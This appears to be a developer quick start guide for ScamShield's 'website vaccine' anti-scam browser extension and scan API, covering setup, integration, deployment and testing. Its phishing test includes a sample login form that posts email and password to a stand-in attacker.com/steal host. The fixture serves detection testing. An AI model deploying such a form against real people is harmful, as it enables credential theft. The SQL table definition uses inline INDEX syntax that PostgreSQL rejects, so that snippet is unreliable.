# Website Vaccine Quick Start Guide

## 5-Minute Setup

### 1. Install Dependencies

```bash
cd scamshield
npm install jsdom
```

### 2. Test the API

```bash
# Start dev server
npm run dev

# In another terminal, test the vaccine endpoint
curl -X POST http://localhost:3000/api/vaccine/scan \
  -H "Content-Type: application/json" \
  -d '{
    "url": "https://example.com"
  }'
```

**Expected Response (200 OK):**
```json
{
  "url": "https://example.com",
  "threatLevel": "safe",
  "threatScore": 5,
  "threatsDetected": [],
  "injectionRules": [],
  "recommendations": [
    "This site appears to be safe."
  ]
}
```

### 3. Test Extension Locally

#### Chrome:
1. Open `chrome://extensions/`
2. Enable "Developer mode" (top right)
3. Click "Load unpacked"
4. Select `scamshield/browser-extension/` folder
5. Visit any website - check extension icon

#### Firefox:
1. Open `about:debugging#/runtime/this-firefox`
2. Click "Load Temporary Add-on"
3. Select `browser-extension/manifest.json`

---

## Integration with Existing ScamShield

### Connect to VERIDICT Engine

In `src/app/api/vaccine/scan/route.ts`, uncomment VERIDICT integration:

```typescript
// Uncomment in route.ts
const [vaccineReport, vericticResult] = await Promise.all([
  vaccineManager.getOrVaccinate(url),
  (async () => {
    const analysisInput: AnalysisInput = {
      text: url,
      type: "url",
      metadata: { source: "vaccine" },
    };
    return await runVERIDICT(analysisInput);
  })(),
]);

// Merge scores (50/50 weighting)
const finalReport = {
  ...vaccineReport,
  vericticScore: vericticResult?.score,
  threatScore: (vaccineReport.threatScore + (vericticResult?.score || 0)) / 2,
};
```

---

## File Structure

```
scamshield/
├── src/
│   ├── lib/
│   │   ├── vaccine/
│   │   │   ├── types.ts              # Core interfaces
│   │   │   ├── website-scraper.ts    # HTML/JS extraction
│   │   │   ├── threat-detector.ts    # Pattern matching
│   │   │   ├── injection-engine.ts   # Script generation
│   │   │   └── vaccine-manager.ts    # Orchestrator
│   │   └── algorithms/               # Existing VERIDICT
│   └── app/api/
│       └── vaccine/
│           ├── scan/route.ts         # POST /api/vaccine/scan
│           └── inject/route.ts       # GET /api/vaccine/inject
│
├── browser-extension/
│   ├── manifest.json                 # MV3 config (updated)
│   ├── background-script.js          # Service worker (new)
│   ├── content-script.js             # Page injection (new)
│   ├── popup.html                    # Popup UI (existing)
│   └── popup.js                      # Popup logic (existing)
│
├── VACCINE_SYSTEM.md                 # Full documentation
└── VACCINE_QUICK_START.md            # This file
```

---

## Common Issues

### "JSDOM is not installed"
```bash
npm install jsdom
```

### Extension not working
1. Verify `manifest.json` has `content_scripts` section
2. Check Chrome DevTools Console (Ctrl+Shift+I)
3. Reload extension (F5 on extensions page)

### API timeout errors
- Increase timeout: `{ timeout: 30000 }` in scraper options
- Check target site is accessible from server

### High memory usage
- Cache stores ~1000 URLs in memory (100MB)
- Implement persistent storage with Supabase (see VACCINE_SYSTEM.md)

---

## Usage Examples

### Scan a URL from JavaScript

```javascript
// In your app or extension
const response = await fetch('/api/vaccine/scan', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ url: 'https://example.com' })
});

const vaccine = await response.json();
console.log(vaccine.threatLevel); // 'safe', 'low', 'medium', 'high', 'critical'
```

### Get Injection Script

```javascript
// Browser extension
const script = await fetch(
  `/api/vaccine/inject?url=${encodeURIComponent(url)}`
).then(r => r.json()).then(d => d.script);

// Inject into page
const scriptElement = document.createElement('script');
scriptElement.textContent = script;
document.head.appendChild(scriptElement);
```

### Check Threat Level in Extension

```javascript
// background-script.js or popup.js
chrome.runtime.sendMessage(
  { type: 'get_vaccine_status' },
  (response) => {
    const vaccine = response.vaccine;
    if (vaccine?.threatScore > 50) {
      // Show warning
    }
  }
);
```

---

## Deployment Steps

### To Vercel (Recommended)

```bash
# 1. Login to Vercel
vercel login

# 2. Deploy
vercel deploy

# 3. Test endpoint
curl -X POST https://scamshield.vercel.app/api/vaccine/scan \
  -H "Content-Type: application/json" \
  -d '{"url":"https://example.com"}'
```

### To Self-Hosted Server

```bash
# 1. Build
npm run build

# 2. Start production server
npm start

# 3. Reverse proxy with Nginx
# See VACCINE_SYSTEM.md for Docker config
```

---

## Database Integration (Optional)

To persist vaccines in Supabase:

```typescript
// In vaccine-manager.ts, add:
import { supabase } from '@/lib/supabase/client';

async function storeVaccine(url: string, report: VaccineReport) {
  await supabase.from('vaccines').insert({
    url,
    threat_level: report.threatLevel,
    threat_score: report.threatScore,
    threats: report.threatsDetected,
    rules: report.injectionRules,
    expires_at: new Date(Date.now() + 24 * 60 * 60 * 1000),
  });
}

async function getStoredVaccine(url: string) {
  const { data } = await supabase
    .from('vaccines')
    .select('*')
    .eq('url', url)
    .gt('expires_at', 'now()') // Only unexpired
    .single();
  return data?.report;
}
```

Create table:
```sql
CREATE TABLE vaccines (
  id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
  url TEXT UNIQUE NOT NULL,
  threat_level TEXT NOT NULL,
  threat_score INTEGER NOT NULL,
  threats JSONB NOT NULL,
  rules JSONB NOT NULL,
  created_at TIMESTAMP DEFAULT now(),
  expires_at TIMESTAMP NOT NULL,
  INDEX idx_url (url),
  INDEX idx_expires (expires_at)
);
```

---

## Testing the Vaccine

### Test #1: Safe Website
```bash
curl -X POST http://localhost:3000/api/vaccine/scan \
  -H "Content-Type: application/json" \
  -d '{"url":"https://google.com"}'

# Should respond with threatLevel: "safe"
```

### Test #2: Phishing Patterns
```bash
# Create a test HTML file with phishing form
# Save as test-phishing.html:
<html>
  <form action="https://attacker.com/steal">
    <input type="email" name="email" placeholder="Email">
    <input type="password" name="password" placeholder="Password">
    <button>Login</button>
  </form>
</html>

# Host it locally (python -m http.server 8000)
# Then scan:
curl -X POST http://localhost:3000/api/vaccine/scan \
  -H "Content-Type: application/json" \
  -d '{"url":"http://localhost:8000/test-phishing.html"}'

# Should detect PHISHING_FORM threat
```

### Test #3: Extension Injection
1. Load extension in Chrome
2. Open DevTools (F12)
3. Go to Console tab
4. Visit any website
5. Check logs for "ScamShield Vaccine: Active"

---

## Monitoring & Debugging

### Check Vaccine Stats
```javascript
// In browser console on any page
console.log(window._scamshieldRules); // Active rules
console.log(window._scamshieldActive); // Is protection on?
```

### View API Logs (Vercel)
```bash
vercel logs
# Filter: /api/vaccine/
```

### Extension Logs
```javascript
// background-script.js
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  console.log('Message:', request);
  // Check Chrome DevTools > Application > Service Workers
});
```

---

## Performance Benchmarks

Expected times on typical website:

| Operation | Time |
|-----------|------|
| Scrape HTML | 500ms - 3s |
| Detect threats | 100ms - 500ms |
| Generate rules | 50ms |
| Total | 700ms - 3.5s |
| Inject script | 10ms |
| Cache hit | 1ms |

---

## Next Steps

1. **Customize Detection**: Adjust threat severity in `threat-detector.ts`
2. **Add Database**: Integrate Supabase storage (see docs)
3. **Deploy Extension**: Submit to Chrome Web Store
4. **Enable Analytics**: Track threat trends, false positives
5. **Community Rules**: Crowdsource malware signatures

---

## Support Resources

- **Docs**: Read `VACCINE_SYSTEM.md` for detailed architecture
- **Examples**: See test files in repository
- **Issues**: Create GitHub issue for bugs
- **Chat**: Discord channel scamshield-dev

---

## License

Copyright 2026 ScamShield
Licensed under MIT License
